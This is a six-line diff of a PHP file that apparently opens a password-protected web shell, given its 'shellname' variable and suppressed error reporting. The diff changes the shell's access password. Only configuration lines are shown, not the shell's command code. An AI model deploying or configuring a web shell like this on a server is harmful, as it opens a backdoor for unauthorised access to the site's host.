@@ -1,6 +1,6 @@
 <?php
 header("Content-type:text/html;charset=utf8");
-$password='yzddmr6';
+$password='bigjkdxs';
 $shellname='Hello By yzddmr6';
 $myurl=null;
 error_reporting(0);
